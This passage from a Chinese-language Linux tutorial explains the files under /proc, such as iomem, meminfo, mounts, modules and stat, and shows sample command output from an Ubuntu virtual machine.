interruptsDFR:          0          0   Deferred Error APIC interruptsMCE:          0          0   Machine check exceptionsMCP:         92         92   Machine check pollsERR:          0MIS:          0PIN:          0          0   Posted-interrupt notification eventNPI:          0          0   Nested posted-interrupt eventPIW:          0          0   Posted-interrupt wakeup event</code></pre><h4 id="iomem"><a href="#iomem" class="headerlink" title="/iomem"></a>/iomem</h4><p>iomem — 每个物理设备上的记忆体（RAM或者ROM）在系统内存中的映射信息；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/iomem00000000-00000000 : Reserved00000000-00000000 : System RAM00000000-00000000 : Reserved00000000-00000000 : PCI Bus 0000:0000000000-00000000 : PCI Bus 0000:00  00000000-00000000 : Video ROM00000000-00000000 : Adapter ROM00000000-00000000 : Reserved  00000000-00000000 : System ROM00000000-00000000 : System RAM  00000000-00000000 : Kernel code  00000000-00000000 : Kernel rodata  00000000-00000000 : Kernel data  00000000-00000000 : Kernel bss00000000-00000000 : Reserved00000000-00000000 : ACPI Tables00000000-00000000 : ACPI Non-volatile Storage00000000-00000000 : PCI Bus 0000:00  00000000-00000000 : PCI Bus 0000:01    00000000-00000000 : 0000:01:00.0  00000000-00000000 : PCI Bus 0000:02  00000000-00000000 : PCI Bus 0000:03  00000000-00000000 : PCI Bus 0000:01    00000000-00000000 : 0000:01:00.0    00000000-00000000 : 0000:01:00.0  00000000-00000000 : 0000:00:05.0  00000000-00000000 : PCI Bus 0000:02  00000000-00000000 : 0000:00:1d.6    00000000-00000000 : xhci-hcd  00000000-00000000 : 0000:00:1d.7    00000000-00000000 : ehci_hcd  00000000-00000000 : PCI Bus 0000:03  00000000-00000000 : 0000:00:1f.2    00000000-00000000 : ahci  00000000-00000000 : 0000:00:1f.3  00000000-00000000 : 0000:00:1f.4    00000000-00000000 : ICH HD audio  00000000-00000000 : PCI MMCONFIG 0000 [bus 00-0f]    00000000-00000000 : pnp 00:0400000000-00000000 : Reserved  00000000-00000000 : IOAPIC 000000000-00000000 : Reserved  00000000-00000000 : HPET 1    00000000-00000000 : PNP0103:0000000000-00000000 : Reserved00000000-00000000 : Local APIC  00000000-00000000 : Reserved00000000-00000000 : INT0800:00  00000000-00000000 : Reserved00000000-00000000 : System RAM</code></pre><h4 id="ioports"><a href="#ioports" class="headerlink" title="/ioports"></a>/ioports</h4><p>ioports — 当前正在使用且已经注册过的与物理设备进行通讯的输入-输出端口范围信息列表；如下面所示，第一列表示注册的I/O端口范围，其后表示相关的设备；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/ioports0000-0000 : PCI Bus 0000:00  0000-0000 : dma1  0000-0000 : pic1  0000-0000 : timer0  0000-0000 : timer1  0000-0000 : keyboard  0000-0000 : PNP0800:00  0000-0000 : PNP0C09:00    0000-0000 : EC data  0000-0000 : keyboard  0000-0000 : PNP0C09:00    0000-0000 : EC cmd  0000-0000 : rtc0  0000-0000 : dma page reg  0000-0000 : pic2  0000-0000 : dma2  0000-0000 : PNP0C04:00    0000-0000 : fpu  0000-0000 : 0000:00:1f.1    0000-0000 : ata_piix  0000-0000 : 0000:00:1f.1    0000-0000 : ata_piix  0000-0000 : 0000:00:1f.1    0000-0000 : ata_piix  0000-0000 : vesafb  0000-0000 : 0000:00:1f.1    0000-0000 : ata_piix  0000-0000 : pnp 00:04  0000-0000 : QEMU0001:000000-0000 : PCI conf10000-0000 : PCI Bus 0000:00  0000-0000 : 0000:00:1f.0    0000-0000 : ACPI PM1a_EVT_BLK    0000-0000 : ACPI PM1a_CNT_BLK    0000-0000 : ACPI PM_TMR    0000-0000 : ACPI PM2_CNT_BLK    0000-0000 : ACPI GPE0_BLK  0000-0000 : gpio_ich.1.auto    0000-0000 : gpio_ich    0000-0000 : gpio_ich  0000-0000 : PCI Bus 0000:01    0000-0000 : 0000:01:00.0      0000-0000 : prl_drm  0000-0000 : 0000:00:03.0    0000-0000 : prl_tg  0000-0000 : 0000:00:05.0    0000-0000 : virtio-pci-legacy  0000-0000 : PCI Bus 0000:02  0000-0000 : 0000:00:0e.0    0000-0000 : virtio-pci-legacy  0000-0000 : 0000:00:1d.0    0000-0000 : uhci_hcd  0000-0000 : PCI Bus 0000:03  0000-0000 : 0000:00:1f.1    0000-0000 : ata_piix  0000-0000 : 0000:00:1f.2    0000-0000 : ahci  0000-0000 : 0000:00:1f.2    0000-0000 : ahci  0000-0000 : 0000:00:1f.2    0000-0000 : ahci  0000-0000 : 0000:00:1f.2    0000-0000 : ahci  0000-0000 : 0000:00:1f.2    0000-0000 : ahci  0000-0000 : 0000:00:1f.3    0000-0000 : i801_smbus</code></pre><h4 id="kallsyms"><a href="#kallsyms" class="headerlink" title="/kallsyms"></a>/kallsyms</h4><p>kallsyms — 模块管理工具用来动态链接或绑定可装载模块的符号定义，由内核输出；（内核2.5.71以后的版本支持此功能）；通常这个文件中的信息量相当大；</p><pre><code>......0000000000000000 t prl_vid_probe.cold   [prl_vid]0000000000000000 r __FUNCTION__.42603   [prl_vid]0000000000000000 d version  [prl_vid]0000000000000000 d prl_vid_pci_driver   [prl_vid]0000000000000000 t prl_vid_cleanup_module   [prl_vid]0000000000000000 d prl_vid_pci_tbl  [prl_vid]0000000000000000 r __param_usedrm   [prl_vid]0000000000000000 r __param_str_usedrm   [prl_vid]0000000000000000 t prl_drm_activate_svga_ioctl  [prl_vid]0000000000000000 t prl_drm_get_memsize_ioctl    [prl_vid]0000000000000000 t prl_drm_irq_handler  [prl_vid]0000000000000000 t prl_kms_connector_atomic_get_property    [prl_vid]0000000000000000 t prl_kms_connector_atomic_set_property    [prl_vid]0000000000000000 t prl_kms_connector_set_property   [prl_vid]0000000000000000 t prl_kms_connector_detect [prl_vid]0000000000000000 t prl_kms_connector_dpms   [prl_vid]0000000000000000 t prl_kms_crtc_helper_atomic_begin [prl_vid]0000000000000000 t prl_kms_crtc_helper_atomic_check [prl_vid]0000000000000000 t prl_kms_crtc_helper_commit   [prl_vid]0000000000000000 t prl_kms_crtc_helper_prepare  [prl_vid]0000000000000000 t prl_kms_crtc_helper_disable  [prl_vid]0000000000000000 t prl_kms_crtc_helper_mode_set_nofb    [prl_vid]0000000000000000 t prl_kms_crtc_gamma_set   [prl_vid]......</code></pre><h4 id="kcore"><a href="#kcore" class="headerlink" title="/kcore"></a>/kcore</h4><p>kcore — 系统使用的物理内存，以ELF核心文件（core file）格式存储，其文件大小为已使用的物理内存（RAM）加上4KB；这个文件用来检查内核数据结构的当前状态，因此，通常由GBD通常调试工具使用，但不能使用文件查看命令打开此文件；</p><h4 id="kmsg"><a href="#kmsg" class="headerlink" title="/kmsg"></a>/kmsg</h4><p>kmsg — 此文件用来保存由内核输出的信息，通常由/sbin/klogd或/bin/dmsg等程序使用，不要试图使用查看命令打开此文件；</p><h4 id="loadavg"><a href="#loadavg" class="headerlink" title="/loadavg"></a>/loadavg</h4><p>loadavg — 保存关于CPU和磁盘I/O的负载平均值，其前三列分别表示每1秒钟、每5秒钟及每15秒的负载平均值，类似于uptime命令输出的相关信息；第四列是由斜线隔开的两个数值，前者表示当前正由内核调度的实体（进程和线程）的数目，后者表示系统当前存活的内核调度实体的数目；第五列表示此文件被查看前最近一个由内核创建的进程的PID；</p><h4 id="locks"><a href="#locks" class="headerlink" title="/locks"></a>/locks</h4><p>locks — 保存当前由内核锁定的文件的相关信息，包含内核内部的调试数据；每个锁定占据一行，且具有一个惟一的编号；如下输出信息中每行的第二列表示当前锁定使用的锁定类别，POSIX表示目前较新类型的文件锁，由lockf系统调用产生，FLOCK是传统的UNIX文件锁，由flock系统调用产生；第三列也通常由两种类型，ADVISORY表示不允许其他用户锁定此文件，但允许读取，MANDATORY表示此文件锁定期间不允许其他用户任何形式的访问；</p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/locks1: POSIX  ADVISORY  READ 19994 08:05:1052576 128 1282: POSIX  ADVISORY  READ 19994 08:05:1052045 1073741826 10737423353: FLOCK  ADVISORY  WRITE 849 00:1c:7 0 EOF4: POSIX  ADVISORY  WRITE 744 00:19:786 0 EOF5: FLOCK  ADVISORY  WRITE 560 00:19:706 0 EOF6: FLOCK  ADVISORY  WRITE 44692 00:37:46 0 EOF</code></pre><h4 id="mdstat"><a href="#mdstat" class="headerlink" title="/mdstat"></a>/mdstat</h4><p>mdstat — 保存RAID相关的多块磁盘的当前状态信息，在没有使用RAID机器上，其显示为如下状态：</p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/mdstatPersonalities : unused devices: &lt;none&gt;</code></pre><h4 id="meminfo"><a href="#meminfo" class="headerlink" title="/meminfo"></a>/meminfo</h4><p>meminfo — 系统中关于当前内存的利用状况等的信息，常由free命令使用；可以使用文件查看命令直接读取此文件，其内容显示为两列，前者为统计属性，后者为对应的值；</p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/meminfoMemTotal:        4023368 kBMemFree:         1633600 kBMemAvailable:    2665656 kBBuffers:           68720 kBCached:          1121116 kBSwapCached:            0 kBActive:          1611916 kBInactive:         480120 kBActive(anon):     903376 kBInactive(anon):     2396 kBActive(file):     708540 kBInactive(file):   477724 kBUnevictable:           0 kBMlocked:               0 kBSwapTotal:       2097148 kBSwapFree:        2097148 kBDirty:               152 kBWriteback:             0 kBAnonPages:        902196 kBMapped:           246020 kBShmem:              3576 kBKReclaimable:     103668 kBSlab:             209292 kBSReclaimable:     103668 kBSUnreclaim:       105624 kBKernelStack:       10108 kBPageTables:        16764 kBNFS_Unstable:          0 kBBounce:                0 kBWritebackTmp:          0 kBCommitLimit:     4108832 kBCommitted_AS:    5164156 kBVmallocTotal:   34359738367 kBVmallocUsed:       29024 kBVmallocChunk:          0 kBPercpu:            30592 kBHardwareCorrupted:     0 kBAnonHugePages:         0 kBShmemHugePages:        0 kBShmemPmdMapped:        0 kBFileHugePages:         0 kBFilePmdMapped:         0 kBHugePages_Total:       0HugePages_Free:        0HugePages_Rsvd:        0HugePages_Surp:        0Hugepagesize:       2048 kBHugetlb:               0 kBDirectMap4k:      255920 kBDirectMap2M:     3938304 kB</code></pre><h4 id="mounts（重点）"><a href="#mounts（重点）" class="headerlink" title="/mounts（重点）"></a>/mounts（重点）</h4><p>mounts — 在内核2.4.29版本以前，此文件的内容为系统当前挂载的所有文件系统，在2.4.19以后的内核中引进了每个进程使用独立挂载名称空间的方式，此文件则随之变成了指向/proc/self/mounts（每个进程自身挂载名称空间中的所有挂载点列表）文件的符号链接；/proc/self是一个独特的目录，后文中会对此目录进行介绍；</p><p>[root@rhel5 ~]# ll /proc |grep mounts</p><p>如下所示，其中第一列表示挂载的设备，第二列表示在当前目录树中的挂载点，第三点表示当前文件系统的类型，第四列表示挂载属性（ro或者rw），第五列和第六列用来匹配/etc/mtab文件中的转储（dump）属性；</p><p>[root@rhel5 ~]# more /proc/mounts </p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/mountssysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0udev /dev devtmpfs rw,nosuid,noexec,relatime,size=1981872k,nr_inodes=495468,mode=755 0 0devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000 0 0tmpfs /run tmpfs rw,nosuid,nodev,noexec,relatime,size=402340k,mode=755 0 0/dev/sda5 / ext4 rw,relatime,errors=remount-ro 0 0securityfs /sys/kernel/security securityfs rw,nosuid,nodev,noexec,relatime 0 0tmpfs /dev/shm tmpfs rw,nosuid,nodev 0 0tmpfs /run/lock tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0tmpfs /sys/fs/cgroup tmpfs ro,nosuid,nodev,noexec,mode=755 0 0cgroup2 /sys/fs/cgroup/unified cgroup2 rw,nosuid,nodev,noexec,relatime,nsdelegate 0 0cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0pstore /sys/fs/pstore pstore rw,nosuid,nodev,noexec,relatime 0 0none /sys/fs/bpf bpf rw,nosuid,nodev,noexec,relatime,mode=700 0 0cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0cgroup /sys/fs/cgroup/freezer cgroup rw,nosuid,nodev,noexec,relatime,freezer 0 0cgroup /sys/fs/cgroup/cpuset cgroup rw,nosuid,nodev,noexec,relatime,cpuset 0 0cgroup /sys/fs/cgroup/blkio cgroup rw,nosuid,nodev,noexec,relatime,blkio 0 0cgroup /sys/fs/cgroup/cpu,cpuacct cgroup rw,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0cgroup /sys/fs/cgroup/hugetlb cgroup rw,nosuid,nodev,noexec,relatime,hugetlb 0 0cgroup /sys/fs/cgroup/perf_event cgroup rw,nosuid,nodev,noexec,relatime,perf_event 0 0cgroup /sys/fs/cgroup/rdma cgroup rw,nosuid,nodev,noexec,relatime,rdma 0 0cgroup /sys/fs/cgroup/memory cgroup rw,nosuid,nodev,noexec,relatime,memory 0 0cgroup /sys/fs/cgroup/devices cgroup rw,nosuid,nodev,noexec,relatime,devices 0 0cgroup /sys/fs/cgroup/pids cgroup rw,nosuid,nodev,noexec,relatime,pids 0 0systemd-1 /proc/sys/fs/binfmt_misc autofs rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=18064 0 0hugetlbfs /dev/hugepages hugetlbfs rw,relatime,pagesize=2M 0 0mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0debugfs /sys/kernel/debug debugfs rw,nosuid,nodev,noexec,relatime 0 0tracefs /sys/kernel/tracing tracefs rw,nosuid,nodev,noexec,relatime 0 0fusectl /sys/fs/fuse/connections fusectl rw,nosuid,nodev,noexec,relatime 0 0configfs /sys/kernel/config configfs rw,nosuid,nodev,noexec,relatime 0 0/dev/loop0 /snap/core18/1885 squashfs ro,nodev,relatime 0 0/dev/loop1 /snap/core18/2066 squashfs ro,nodev,relatime 0 0/dev/loop2 /snap/gnome-3-34-1804/66 squashfs ro,nodev,relatime 0 0/dev/loop3 /snap/gtk-common-themes/1506 squashfs ro,nodev,relatime 0 0/dev/loop4 /snap/gnome-3-34-1804/36 squashfs ro,nodev,relatime 0 0/dev/loop5 /snap/snapd/11841 squashfs ro,nodev,relatime 0 0/dev/loop6 /snap/snap-store/467 squashfs ro,nodev,relatime 0 0/dev/loop7 /snap/snap-store/518 squashfs ro,nodev,relatime 0 0/dev/loop8 /snap/gtk-common-themes/1515 squashfs ro,nodev,relatime 0 0/dev/sda1 /boot/efi vfat rw,relatime,fmask=0077,dmask=0077,codepage=437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro 0 0Home /media/psf/Home prl_fs rw,sync,nosuid,nodev,noatime,ttl=250,share 0 0HRSword_Installer /media/psf/HRSword_Installer prl_fs rw,sync,nosuid,nodev,noatime,ttl=250,share 0 0iCloud /media/psf/iCloud prl_fs rw,sync,nosuid,nodev,noatime,ttl=250,share 0 0tmpfs /run/user/1000 tmpfs rw,nosuid,nodev,relatime,size=402336k,mode=700,uid=1000,gid=1000 0 0tmpfs /run/snapd/ns tmpfs rw,nosuid,nodev,noexec,relatime,size=402340k,mode=755 0 0nsfs /run/snapd/ns/snap-store.mnt nsfs rw 0 0tmpfs /run/user/125 tmpfs rw,nosuid,nodev,relatime,size=402336k,mode=700,uid=125,gid=130 0 0gvfsd-fuse /run/user/125/gvfs fuse.gvfsd-fuse rw,nosuid,nodev,relatime,user_id=125,group_id=130 0 0gvfsd-fuse /run/user/1000/gvfs fuse.gvfsd-fuse rw,nosuid,nodev,relatime,user_id=1000,group_id=1000 0 0/dev/fuse /run/user/1000/doc fuse rw,nosuid,nodev,relatime,user_id=1000,group_id=1000 0 0/dev/loop10 /snap/snapd/12057 squashfs ro,nodev,relatime 0 0</code></pre><h4 id="modules"><a href="#modules" class="headerlink" title="/modules"></a>/modules</h4><p>modules — 当前装入内核的所有模块名称列表，可以由lsmod命令使用，也可以直接查看；如下所示，其中第一列表示模块名，第二列表示此模块占用内存空间大小，第三列表示此模块有多少实例被装入，第四列表示此模块依赖于其它哪些模块，第五列表示此模块的装载状态（Live：已经装入；Loading：正在装入；Unloading：正在卸载），第六列表示此模块在内核内存（kernel memory）中的偏移量；</p><pre><code>parallels@ubuntu:~/Documents$ lsmod Module                  Size  Used byusblp                  24576  0prl_fs_freeze          16384  0prl_fs                 28672  3prl_eth                16384  0nls_iso8859_1          16384  1snd_hda_codec_generic    81920  1ledtrig_audio          16384  1 snd_hda_codec_genericsnd_hda_intel          53248  9snd_intel_dspcfg       24576  1 snd_hda_intelsnd_hda_codec         139264  2 snd_hda_codec_generic,snd_hda_intelsnd_hda_core           94208  3 snd_hda_codec_generic,snd_hda_intel,snd_hda_codecsnd_hwdep              20480  1 snd_hda_codecsnd_pcm               114688  4 snd_hda_intel,snd_hda_codec,snd_hda_coresnd_seq_midi           20480  0snd_seq_midi_event     16384  1 snd_seq_midisnd_rawmidi            36864  1 snd_seq_midisnd_seq                69632  2 snd_seq_midi,snd_seq_midi_eventintel_rapl_msr         20480  0intel_rapl_common      28672  1 intel_rapl_msrx86_pkg_temp_thermal    20480  0coretemp               20480  0crct10dif_pclmul       16384  1ghash_clmulni_intel    16384  0snd_seq_device         16384  3 snd_seq,snd_seq_midi,snd_rawmidisnd_timer              40960  3 snd_seq,snd_pcmaesni_intel           372736  0crypto_simd            16384  1 aesni_intelcryptd                 24576  2 crypto_simd,ghash_clmulni_intelglue_helper            16384  1 aesni_intelrapl                   20480  0snd                    94208  25 snd_hda_codec_generic,snd_seq,snd_seq_device,snd_hwdep,snd_hda_intel,snd_hda_codec,snd_timer,snd_pcm,snd_rawmidiuvcvideo               98304  0videobuf2_vmalloc      20480  1 uvcvideoinput_leds             16384  0videobuf2_memops       20480  1 videobuf2_vmallocvideobuf2_v4l2         24576  1 uvcvideosoundcore              16384  1 sndserio_raw              20480  0videobuf2_common       57344  2 videobuf2_v4l2,uvcvideovideodev              241664  3 videobuf2_v4l2,uvcvideo,videobuf2_commonjoydev                 24576  0sbs                    20480  0mc                     57344  4 videodev,videobuf2_v4l2,uvcvideo,videobuf2_commonsbshc                  16384  1 sbsmac_hid                16384  0pvpanic                16384  0sch_fq_codel           20480  2parport_pc             45056  0ppdev                  24576  0lp                     20480  0parport                65536  3 parport_pc,lp,ppdevip_tables              32768  0x_tables               49152  1 ip_tablesautofs4                45056  2prl_vid                53248  7drm_kms_helper        217088  1 prl_vidgpio_ich               16384  0syscopyarea            16384  1 drm_kms_helpersysfillrect            16384  1 drm_kms_helpersysimgblt              16384  1 drm_kms_helperfb_sys_fops            16384  1 drm_kms_helpercec                    53248  1 drm_kms_helperrc_core                57344  1 ceccrc32_pclmul           16384  0drm                   552960  9 drm_kms_helper,prl_vidi2c_i801               32768  0i2c_smbus              20480  1 i2c_i801psmouse               155648  0ahci                   40960  2libahci                36864  1 ahcipata_acpi              16384  0xhci_pci               20480  0xhci_pci_renesas       20480  1 xhci_pcilpc_ich                24576  0virtio_net             57344  0net_failover           20480  1 virtio_netfailover               16384  1 net_failoverprl_tg                 28672  17 prl_vid,prl_fshid_generic            16384  0usbhid                 57344  0hid                   135168  2 usbhid,hid_genericparallels@ubuntu:~/Documents$ cat /proc/Display all 312 possibilities? (y or n)parallels@ubuntu:~/Documents$ cat /proc/modulesusblp 24576 0 - Live 0x0000000000000000prl_fs_freeze 16384 0 - Live 0x0000000000000000 (POE)prl_fs 28672 3 - Live 0x0000000000000000 (POE)prl_eth 16384 0 - Live 0x0000000000000000 (POE)nls_iso8859_1 16384 1 - Live 0x0000000000000000snd_hda_codec_generic 81920 1 - Live 0x0000000000000000ledtrig_audio 16384 1 snd_hda_codec_generic, Live 0x0000000000000000snd_hda_intel 53248 6 - Live 0x0000000000000000snd_intel_dspcfg 24576 1 snd_hda_intel, Live 0x0000000000000000snd_hda_codec 139264 2 snd_hda_codec_generic,snd_hda_intel, Live 0x0000000000000000snd_hda_core 94208 3 snd_hda_codec_generic,snd_hda_intel,snd_hda_codec, Live 0x0000000000000000snd_hwdep 20480 1 snd_hda_codec, Live 0x0000000000000000snd_pcm 114688 3 snd_hda_intel,snd_hda_codec,snd_hda_core, Live 0x0000000000000000snd_seq_midi 20480 0 - Live 0x0000000000000000snd_seq_midi_event 16384 1 snd_seq_midi, Live 0x0000000000000000snd_rawmidi 36864 1 snd_seq_midi, Live 0x0000000000000000snd_seq 69632 2 snd_seq_midi,snd_seq_midi_event, Live 0x0000000000000000intel_rapl_msr 20480 0 - Live 0x0000000000000000intel_rapl_common 28672 1 intel_rapl_msr, Live 0x0000000000000000x86_pkg_temp_thermal 20480 0 - Live 0x0000000000000000coretemp 20480 0 - Live 0x0000000000000000crct10dif_pclmul 16384 1 - Live 0x0000000000000000ghash_clmulni_intel 16384 0 - Live 0x0000000000000000snd_seq_device 16384 3 snd_seq_midi,snd_rawmidi,snd_seq, Live 0x0000000000000000snd_timer 40960 2 snd_pcm,snd_seq, Live 0x0000000000000000aesni_intel 372736 0 - Live 0x0000000000000000crypto_simd 16384 1 aesni_intel, Live 0x0000000000000000cryptd 24576 2 ghash_clmulni_intel,crypto_simd, Live 0x0000000000000000glue_helper 16384 1 aesni_intel, Live 0x0000000000000000rapl 20480 0 - Live 0x0000000000000000snd 94208 21 snd_hda_codec_generic,snd_hda_intel,snd_hda_codec,snd_hwdep,snd_pcm,snd_rawmidi,snd_seq,snd_seq_device,snd_timer, Live 0x0000000000000000uvcvideo 98304 0 - Live 0x0000000000000000videobuf2_vmalloc 20480 1 uvcvideo, Live 0x0000000000000000input_leds 16384 0 - Live 0x0000000000000000videobuf2_memops 20480 1 videobuf2_vmalloc, Live 0x0000000000000000videobuf2_v4l2 24576 1 uvcvideo, Live 0x0000000000000000soundcore 16384 1 snd, Live 0x0000000000000000serio_raw 20480 0 - Live 0x0000000000000000videobuf2_common 57344 2 uvcvideo,videobuf2_v4l2, Live 0x0000000000000000videodev 241664 3 uvcvideo,videobuf2_v4l2,videobuf2_common, Live 0x0000000000000000joydev 24576 0 - Live 0x0000000000000000sbs 20480 0 - Live 0x0000000000000000mc 57344 4 uvcvideo,videobuf2_v4l2,videobuf2_common,videodev, Live 0x0000000000000000sbshc 16384 1 sbs, Live 0x0000000000000000mac_hid 16384 0 - Live 0x0000000000000000pvpanic 16384 0 - Live 0x0000000000000000sch_fq_codel 20480 2 - Live 0x0000000000000000parport_pc 45056 0 - Live 0x0000000000000000ppdev 24576 0 - Live 0x0000000000000000lp 20480 0 - Live 0x0000000000000000parport 65536 3 parport_pc,ppdev,lp, Live 0x0000000000000000ip_tables 32768 0 - Live 0x0000000000000000x_tables 49152 1 ip_tables, Live 0x0000000000000000autofs4 45056 2 - Live 0x0000000000000000prl_vid 53248 7 - Live 0x0000000000000000 (POE)drm_kms_helper 217088 1 prl_vid, Live 0x0000000000000000gpio_ich 16384 0 - Live 0x0000000000000000syscopyarea 16384 1 drm_kms_helper, Live 0x0000000000000000sysfillrect 16384 1 drm_kms_helper, Live 0x0000000000000000sysimgblt 16384 1 drm_kms_helper, Live 0x0000000000000000fb_sys_fops 16384 1 drm_kms_helper, Live 0x0000000000000000cec 53248 1 drm_kms_helper, Live 0x0000000000000000rc_core 57344 1 cec, Live 0x0000000000000000crc32_pclmul 16384 0 - Live 0x0000000000000000drm 552960 9 prl_vid,drm_kms_helper, Live 0x0000000000000000i2c_i801 32768 0 - Live 0x0000000000000000i2c_smbus 20480 1 i2c_i801, Live 0x0000000000000000psmouse 155648 0 - Live 0x0000000000000000ahci 40960 2 - Live 0x0000000000000000libahci 36864 1 ahci, Live 0x0000000000000000pata_acpi 16384 0 - Live 0x0000000000000000xhci_pci 20480 0 - Live 0x0000000000000000xhci_pci_renesas 20480 1 xhci_pci, Live 0x0000000000000000lpc_ich 24576 0 - Live 0x0000000000000000virtio_net 57344 0 - Live 0x0000000000000000net_failover 20480 1 virtio_net, Live 0x0000000000000000failover 16384 1 net_failover, Live 0x0000000000000000prl_tg 28672 17 prl_fs,prl_vid, Live 0x0000000000000000 (POE)hid_generic 16384 0 - Live 0x0000000000000000usbhid 57344 0 - Live 0x0000000000000000hid 135168 2 hid_generic,usbhid, Live 0x0000000000000000</code></pre><h4 id="partitions"><a href="#partitions" class="headerlink" title="/partitions"></a>/partitions</h4><p>partition — 块设备每个分区的主设备号（major）和次设备号（minor）等信息，同时包括每个分区所包含的块（block）数目（如下面输出中第三列所示）；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/partitionsmajor minor  #blocks  name   7        0      56648 loop0   7        1      56752 loop1   7        2     224248 loop2   7        3      63580 loop3   7        4     261700 loop4   7        5      32856 loop5   7        6      50980 loop6   7        7      52268 loop7   8        0   67108864 sda   8        1     524288 sda1   8        2          1 sda2   8        5   66581504 sda5  11        0    1048575 sr0   7        8      66660 loop8   7       10      32872 loop10</code></pre><h4 id="pci"><a href="#pci" class="headerlink" title="/pci"></a>/pci</h4><p>pci — 内核初始化时发现的所有PCI设备及其配置信息列表，其配置信息多为某PCI设备相关IRQ信息，可读性不高，可以用“/sbin/lspci –vb”命令获得较易理解的相关信息；在2.6内核以后，此文件已为/proc/bus/pci目录及其下的文件代替；</p><pre><code>parallels@ubuntu:~/Documents$ sudo ls /proc/bus/pci00  01  devices</code></pre><h4 id="slabinfo"><a href="#slabinfo" class="headerlink" title="/slabinfo"></a>/slabinfo</h4><p>slabinfo — 在内核中频繁使用的对象（如inode、dentry等）都有自己的cache，即slab pool，而/proc/slabinfo文件列出了这些对象相关slap的信息；详情可以参见内核文档中slapinfo的手册页；</p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/slabinfoslabinfo - version: 2.1# name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;ext4_groupinfo_4k    532    532    144   28    1 : tunables    0    0    0 : slabdata     19     19      0fsverity_info          0      0    256   32    2 : tunables    0    0    0 : slabdata      0      0      0MPTCPv6                0      0   1856   17    8 : tunables    0    0    0 : slabdata      0      0      0ip6-frags              0      0    184   44    2 : tunables    0    0    0 : slabdata      0      0      0PINGv6                 0      0   1216   26    8 : tunables    0    0    0 : slabdata      0      0      0RAWv6                338    338   1216   26    8 : tunables    0    0    0 : slabdata     13     13      0......</code></pre><h4 id="stat"><a href="#stat" class="headerlink" title="/stat"></a>/stat</h4><p>stat — 实时追踪自系统上次启动以来的多种统计信息；如下所示，其中，</p><p>“cpu”行后的八个值分别表示以1/100（jiffies）秒为单位的统计值（包括系统运行于用户模式、低优先级用户模式，运系统模式、空闲模式、I/O等待模式的时间等）；</p><p>“intr”行给出中断的信息，第一个为自系统启动以来，发生的所有的中断的次数；然后每个数对应一个特定的中断自系统启动以来所发生的次数；</p><p>“ctxt”给出了自系统启动以来CPU发生的上下文交换的次数。</p><p>“btime”给出了从系统启动到现在为止的时间，单位为秒；</p><p>“processes (total_forks) 自系统启动以来所创建的任务的个数目；</p><p>“procs_running”：当前运行队列的任务的数目；</p><p>“procs_blocked”：当前被阻塞的任务的数目；</p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/statcpu  2567490 1440 51293 4222742 573 0 570 0 0 0cpu0 1517356 706 23050 1852688 351 0 237 0 0 0cpu1 1050133 734 28242 2370053 221 0 332 0 0 0intr 10703208 5 3393 0 0 0 0 0 0 1 72225 0 0 144 0 0 0 0 0 14598 221 0 0 0 0 0 28244 28 7018 10447 43 61479 32574 13193 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 